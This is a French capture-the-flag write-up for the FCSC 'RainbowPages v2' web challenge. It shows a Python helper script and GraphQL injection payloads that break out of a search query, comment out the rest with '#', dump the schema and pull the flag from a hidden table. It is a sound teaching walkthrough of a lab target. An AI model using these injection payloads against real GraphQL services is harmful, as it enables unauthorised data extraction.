# RainbowPages v2

Points : 250 (dynamique)

```
La première version de notre plateforme de recherche de
cuisiniers présentait quelques problèmes de sécurité.
Heureusement, notre développeur ne compte pas ses heures
et a corrigé l'application en nous affirmant que plus rien n'était
désormais exploitable. Il en a également profiter
pour améliorer la recherche des chefs.

Pouvez-vous encore trouver un problème de sécurité ?

URL : http://challenges2.france-cybersecurity-challenge.fr:5007/
```
*Ce challenge fait suite au challenge RainbowPages*

## Analyse

En allant sur le lien donné par la description du challenge, je tombe sur un site de recherche de chefs cuisiniers.

Je peux effectuer des recherches à l'aide du champ "Search one chef". En analysant le code source de la page, je tombe sur une fonction javascript qui envoie ma recherche par la méthode GET avec l'argument search à la page : ```index.php```.

Voici le code intéressant:

```js
function makeSearch(searchInput) {
			if(searchInput.length == 0) {
				alert("You must provide at least one character!");
				return false;
			}

			var searchValue = btoa(searchInput);
			var bodyForm = new FormData();
			bodyForm.append("search", searchValue);

			fetch("index.php?search="+searchValue, {
				method: "GET"
			}).then(function(response) {
				response.json().then(function(data) {
					data = eval(data);
					data = data['data']['allCooks']['nodes'];
					$("#results thead").show()
					var table = $("#results tbody");
					table.html("")
					$("#empty").hide();
					data.forEach(function(item, index, array){
						table.append("<tr class='table-dark'><td>"+item['firstname']+" "+ item['lastname']+"</td><td>"+item['speciality']+"</td><td>"+(item['price']/100)+"</td></tr>");
					});
					$("#count").html(data.length)
					$("#count").show()
				});
			});
		}
```

Je remarque aussi la fonction ```btoa``` qui permet d'encoder une chaîne de caractères en base64.

L'outil "Réseau" (Crtl+Maj+I) de FireFox permet de voir les requêtes envoyées par le navigateur, j'en récupère donc une.

## Recherche du point d'exploitation

En se basant sur le premier challenge, je sais que le type de données envoyé est du GraphQL.

J'ai ensuite fait un script python qui me permet d'encoder mes données puis de les envoyer au site pour récupérer le résultat.

```python
import requests
import base64

URL = "http://challenges2.france-cybersecurity-challenge.fr:5007/index.php?search={0}"

while True:

    injection = input("Command to inject : ")

    binjection = base64.b64encode(injection.encode()).decode()

    _url = URL.format(binjection)

    res = requests.get(_url)

    print("\n=> Result : " + res.text + "\n")
```

Mon but premier était de faire une requête valide. Alors, j'ai cherché à fermer la première requête en ajoutant un des caractères suivant : '}', ']', ')'.

Si le site me renvoyait une erreur liée à un de ces caractères, je savais donc qu'il n'était pas bon. Sinon cela voulait dire que je fermais une condition, filtre ou autre.

Voila un court exemple :

```GraphQL
Command to inject : 2%"}

=> Result : {"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":1,"column":55}]}]}

Command to inject : 2%"}]

=> Result : {"errors":[{"message":"Syntax Error: Expected Name, found ]","locations":[{"line":1,"column":55}]}]}

Command to inject : 2%"}}

=> Result : {"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":1,"column":56}]}]}

[snip]

Command to inject : 2%"}}]})}]

=> Result : {"errors":[{"message":"Syntax Error: Unexpected ]","locations":[{"line":1,"column":60}]}]}

Command to inject : 2%"}}]})})

=> Result : {"errors":[{"message":"Syntax Error: Unexpected )","locations":[{"line":1,"column":60}]}]}

Command to inject : 2%"}}]})}}

=> Result : {"errors":[{"message":"Syntax Error: Unexpected }","locations":[{"line":1,"column":60}]}]}
```

Tous les caractères étant "Unexpected" cela veut dire que j'ai trouvé le moyen de fermer la requête.

## Exploitation

### __schema

La table ```__schema``` est un équivalent d'après moi de la table ```informations_schema``` sous SQL. Elle contient les informations sur les noms des tables et autres.

Avec l'aide de la documentation, je trouve le moyen de pouvoir dump le nom de toutes les tables disponibles.

```GraphQL
__schema {
  types {
    name
  }
}
```

Je peux donc ajouter cette requête à celle trouvée dans la partie de reconnaissance.

Bien évidemment, il me faut la modifier. J'ajoute ```nodes``` qui permet de renvoyer une valeur pour ne pas que la requête ne génère d'erreur.

Voici la requête actuelle :

```GraphQL
2%"}}]}) { nodes { firstname }}, __schema { types { name }}}
```

J'essaye de la lancer mais j'ai un message d'erreur. Sans doute la deuxième partie de la requête qui pose problème.

### Bypass & Extraction des champs

Après quelques heures d'intenses recherches, dans un élan de désespoir, j'ajoute le caractère '#' qui pourrait me commenter le reste de la requête.

CA FONTIONNE !

```GraphQL
Command to inject : 2%"}}]}) { nodes { firstname }}, __schema { types { name }}}#  

=> Result : {"data":{"allCooks":{"nodes":[]},"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"Int"},{"name":"Cursor"},{"name":"CooksOrderBy"},{"name":"CookCondition"},{"name":"String"},{"name":"CookFilter"},{"name":"IntFilter"},{"name":"Boolean"},{"name":"StringFilter"},{"name":"CooksConnection"},{"name":"Cook"},{"name":"CooksEdge"},{"name":"PageInfo"},{"name":"FlagNotTheSameTableNamesOrderBy"},{"name":"FlagNotTheSameTableNameCondition"},{"name":"FlagNotTheSameTableNameFilter"},{"name":"FlagNotTheSameTableNamesConnection"},{"name":"FlagNotTheSameTableName"},{"name":"FlagNotTheSameTableNamesEdge"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

Me voilà en possession de tous les noms de tables. J'essaye de voir ce qui se cache dans la table ```FlagNotTheSameTableName``` qui me semble fort intéressant.


J'ajoute ```all``` au début et un ```s``` à la fin du nom de la table (Pattern des tables requêtées).
```GraphQL
Command to inject : 2%"}}]}) { nodes { firstname }}, allFlagNotTheSameTableNames {nodes { FlagNotTheSameTableName }}}#   

=> Result : {"errors":[{"message":"Cannot query field \"FlagNotTheSameTableName\" on type \"FlagNotTheSameTableName\". Did you mean \"flagNotTheSameFieldName\"?","locations":[{"line":1,"column":121}]}]}
```

Parfait ! J'ai pu récupérer le nom du champ. J'essaye la requête en remplaçant ce qui pose problème.

```GraphQL
Command to inject : 2%"}}]}) { nodes { firstname }}, allFlagNotTheSameTableNames {nodes { flagNotTheSameFieldName }}}#  

=> Result : {"data":{"allCooks":{"nodes":[]},"allFlagNotTheSameTableNames":{"nodes":[{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}]}}}
```

flag: ```FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}```
